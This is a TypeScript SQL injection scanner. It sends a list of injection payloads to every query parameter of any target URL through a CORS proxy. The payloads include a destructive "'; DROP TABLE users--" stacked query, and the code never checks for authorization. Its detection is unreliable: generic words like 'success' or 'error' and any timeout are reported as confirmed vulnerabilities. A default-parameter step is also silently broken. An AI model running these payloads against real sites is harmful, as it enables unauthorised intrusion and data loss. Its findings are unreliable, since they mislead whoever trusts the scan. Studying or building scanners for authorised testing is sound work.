import { normalizeUrl } from './apiUtils';
import { corsProxy } from './corsProxy';

export interface SQLScanResult {
  vulnerable: boolean;
  testedPayloads: number;
  vulnerabilities: Array<{
    payload: string;
    indicator: string;
    severity: 'critical' | 'high' | 'medium' | 'low';
    type: string;
    evidence?: string;
    parameter?: string;
  }>;
  tested: boolean;
  method: string;
}

// Real SQL injection payloads used by professional pentesters
const SQL_PAYLOADS = [
  // Error-based SQL injection
  { payload: "'", type: 'Error-based', severity: 'high' as const, indicators: ['sql', 'mysql', 'syntax', 'error', 'query', 'database', 'mysqli', 'postgresql', 'oracle', 'sqlite', 'mariadb', 'warning', 'unclosed'] },
  { payload: "\"", type: 'Error-based', severity: 'high' as const, indicators: ['sql', 'mysql', 'syntax', 'error', 'query', 'database'] },
  { payload: "' OR '1'='1", type: 'Boolean-based', severity: 'critical' as const, indicators: ['welcome', 'dashboard', 'logged', 'success', 'admin'] },
  { payload: "' OR 1=1--", type: 'Boolean-based', severity: 'critical' as const, indicators: ['true', 'success', 'admin', 'user', 'login'] },
  { payload: "' OR 'a'='a", type: 'Boolean-based', severity: 'critical' as const, indicators: ['true', 'success'] },
  { payload: "1' OR '1'='1' --", type: 'Boolean-based', severity: 'critical' as const, indicators: ['true', 'success'] },
  { payload: "admin' --", type: 'Comment-based', severity: 'high' as const, indicators: ['admin', 'success', 'welcome', 'dashboard'] },
  { payload: "admin' #", type: 'Comment-based', severity: 'high' as const, indicators: ['admin', 'success'] },
  
  // Union-based SQL injection
  { payload: "' UNION SELECT NULL--", type: 'Union-based', severity: 'critical' as const, indicators: ['null', 'union', 'select'] },
  { payload: "' UNION SELECT NULL,NULL--", type: 'Union-based', severity: 'critical' as const, indicators: ['null', 'union'] },
  { payload: "' UNION ALL SELECT NULL--", type: 'Union-based', severity: 'critical' as const, indicators: ['null', 'union'] },
  
  // Time-based blind SQL injection
  { payload: "' AND SLEEP(5)--", type: 'Time-based Blind', severity: 'critical' as const, indicators: [] },
  { payload: "' OR SLEEP(5)--", type: 'Time-based Blind', severity: 'critical' as const, indicators: [] },
  { payload: "1' WAITFOR DELAY '0:0:5'--", type: 'Time-based Blind', severity: 'critical' as const, indicators: [] },
  { payload: "'; WAITFOR DELAY '0:0:5'--", type: 'Time-based Blind', severity: 'critical' as const, indicators: [] },
  
  // Stacked queries
  { payload: "'; DROP TABLE users--", type: 'Stacked Query', severity: 'critical' as const, indicators: ['syntax', 'error', 'drop'] },
  { payload: "1'; SELECT SLEEP(5)--", type: 'Stacked Query', severity: 'critical' as const, indicators: [] },
  
  // Advanced payloads
  { payload: "' AND 1=2 UNION SELECT NULL--", type: 'Union-based', severity: 'critical' as const, indicators: ['null', 'union'] },
  { payload: "' AND '1'='2", type: 'Boolean-based', severity: 'medium' as const, indicators: ['false', 'error', 'invalid'] },
];

const testTimeBased = async (url: string): Promise<boolean> => {
  const startTime = Date.now();
  
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 8000);
    
    await corsProxy.fetch(url, { timeout: 8000 });
    
    clearTimeout(timeoutId);
    const duration = Date.now() - startTime;
    
    // If response took 4.5+ seconds, likely vulnerable
    return duration >= 4500;
  } catch (error: any) {
    if (error.name === 'AbortError') {
      return true; // Timeout indicates time-based injection worked
    }
    return false;
  }
};

export const performSQLScan = async (target: string): Promise<SQLScanResult> => {
  console.log(`[SQL Scan] Starting REAL vulnerability scan for ${target}`);
  
  const result: SQLScanResult = {
    vulnerable: false,
    testedPayloads: 0,
    vulnerabilities: [],
    tested: true,
    method: 'Real Payload Testing',
  };

  try {
    const url = normalizeUrl(target);
    const urlObj = new URL(url);
    
    // Get parameters to test
    const params = new URLSearchParams(urlObj.search);
    const paramKeys = Array.from(params.keys());
    
    if (paramKeys.length === 0) {
      paramKeys.push('id'); // Default parameter
      urlObj.search = '?id=1';
    }

    // Get baseline response
    let baselineResponse: Response | null = null;
    let baselineText = '';
    let baselineStatus = 0;
    
    try {
      baselineResponse = await corsProxy.fetch(url);
      baselineText = await baselineResponse.text();
      baselineStatus = baselineResponse.status;
      console.log('[SQL Scan] Baseline response captured');
    } catch (error) {
      console.warn('[SQL Scan] Could not get baseline response');
    }

    // Test each parameter with each payload
    for (const paramKey of paramKeys) {
      for (const { payload, indicators, severity, type } of SQL_PAYLOADS) {
        try {
          const testUrl = new URL(url);
          const testParams = new URLSearchParams(testUrl.search);
          const originalValue = testParams.get(paramKey) || '1';
          
          // Inject payload
          testParams.set(paramKey, originalValue + payload);
          testUrl.search = testParams.toString();

          console.log(`[SQL Scan] Testing ${type} on parameter '${paramKey}': ${payload.substring(0, 30)}...`);

          // Time-based testing
          if (type === 'Time-based Blind' || type === 'Stacked Query') {
            const isVulnerable = await testTimeBased(testUrl.toString());
            
            if (isVulnerable) {
              console.log(`[SQL Scan] ⚠️ CRITICAL: ${type} SQL injection detected on parameter '${paramKey}'!`);
              result.vulnerable = true;
              result.vulnerabilities.push({
                payload,
                indicator: 'Response delayed by 5+ seconds',
                severity: 'critical',
                type,
                evidence: 'Time-based blind SQL injection confirmed - server delayed response',
                parameter: paramKey,
              });
            }
            
            result.testedPayloads++;
            await new Promise(resolve => setTimeout(resolve, 500));
            continue;
          }

          // Error-based and other testing
          const response = await corsProxy.fetch(testUrl.toString());
          result.testedPayloads++;

          const text = await response.text();
          const lowerText = text.toLowerCase();

          // Check for SQL error messages
          for (const indicator of indicators) {
            if (lowerText.includes(indicator)) {
              console.log(`[SQL Scan] ⚠️ ${severity.toUpperCase()}: ${type} SQL injection detected with indicator: ${indicator}`);
              result.vulnerable = true;
              
              const evidenceStart = lowerText.indexOf(indicator);
              const evidence = text.substring(Math.max(0, evidenceStart - 100), Math.min(text.length, evidenceStart + 200));
              
              result.vulnerabilities.push({
                payload,
                indicator,
                severity,
                type,
                evidence: evidence.substring(0, 300) + '...',
                parameter: paramKey,
              });
              break;
            }
          }

          // Check for status code changes
          if (baselineStatus > 0 && response.status !== baselineStatus && response.status >= 500) {
            console.log(`[SQL Scan] ⚠️ Server error detected (${response.status}) - possible SQL injection`);
            result.vulnerable = true;
            result.vulnerabilities.push({
              payload,
              indicator: `HTTP ${response.status} error`,
              severity: 'high',
              type,
              evidence: `Server returned ${response.status} status code (baseline: ${baselineStatus})`,
              parameter: paramKey,
            });
          }

          // Check for significant content changes (Union-based)
          if (baselineText && type === 'Union-based') {
            const sizeDiff = Math.abs(text.length - baselineText.length);
            if (sizeDiff > 500) {
              console.log(`[SQL Scan] ⚠️ Significant content change detected - possible Union injection`);
              result.vulnerable = true;
              result.vulnerabilities.push({
                payload,
                indicator: 'Content length changed significantly',
                severity: 'critical',
                type,
                evidence: `Response size changed from ${baselineText.length} to ${text.length} bytes (diff: ${sizeDiff})`,
                parameter: paramKey,
              });
            }
          }

          await new Promise(resolve => setTimeout(resolve, 300));
        } catch (error: any) {
          console.warn(`[SQL Scan] Payload test failed: ${error.message}`);
        }
      }
    }

    console.log(`[SQL Scan] Complete: ${result.vulnerabilities.length} vulnerabilities found from ${result.testedPayloads} tests`);
    return result;
  } catch (error: any) {
    console.error('[SQL Scan] Critical error:', error);
    return {
      vulnerable: false,
      testedPayloads: 0,
      vulnerabilities: [],
      tested: false,
      method: 'Failed',
    };
  }
};